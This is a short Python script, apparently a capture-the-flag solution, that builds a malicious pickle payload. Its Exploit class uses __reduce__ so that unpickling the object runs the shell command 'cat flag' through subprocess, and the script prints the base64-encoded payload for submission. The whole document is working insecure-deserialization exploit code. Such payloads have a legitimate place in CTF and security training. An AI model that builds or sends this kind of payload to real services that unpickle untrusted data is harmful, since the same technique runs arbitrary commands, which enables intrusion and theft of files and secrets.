import pickle
import base64
import subprocess

class Exploit(object):
    def __reduce__(self):
        return (subprocess.getoutput, ("cat flag",))


def main():
    print("Testing CTF")
    payload = pickle.dumps(Exploit(), protocol=2)
    print(base64.b64encode(payload).decode())


if __name__ == "__main__":
    main()